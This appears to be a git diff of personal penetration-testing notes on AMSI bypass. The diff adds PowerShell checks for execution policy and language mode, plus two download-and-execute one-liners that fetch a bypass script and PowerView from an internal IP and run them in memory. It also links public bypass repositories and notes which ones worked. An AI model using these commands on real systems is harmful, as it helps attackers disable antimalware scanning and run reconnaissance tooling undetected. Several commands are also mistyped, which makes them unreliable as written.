@@ -23,13 +23,21 @@
 &nbsp;  
 
 ## AMSI Bypass
+6. Get-ExecutionPolicy -list (make sure only unrestricted for CurrentUser)
+7. $ExecutionContext.SessionState --> Make sure LanguageMode is FullLanguage
+8.   -set $ExecutionContext.SessionState.LanguageMode = "FullLanguage"
+
+right way iex (New-Object New.WebClient).DownloadString("https://10.0.0.7/amsi/bypass.ps1")
+iex (New-Object New.WebClient).DownloadString("https:10.0.0.7/powersploit/PowerSploit-master/Recon/PowerView.ps1")
 
 1. Source 1: [S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)  
 
 2. Source 2: [reigningshells/powershell-bypasses.ps1](https://gist.github.com/reigningshells/a255fcca07465befbcbf4be9cdf67560)  
 &nbsp;&nbsp;&nbsp;&nbsp;- *This works*  
 
-3. Source 3: [NullPtrStack/amsi-bypass](https://nullptrstack.github.io/amsi-bypass/)  
+3. Source 3: [NullPtrStack/amsi-bypass](https://nullptrstack.github.io/amsi-bypass/)
+4. source 3 bypass has no return outut
+5. amsiinitfailed returns that it isn't the name of a cmdlet, function, etc
 &nbsp;&nbsp;&nbsp;&nbsp;- *Test with the bypass in this one*
 
 &nbsp;  
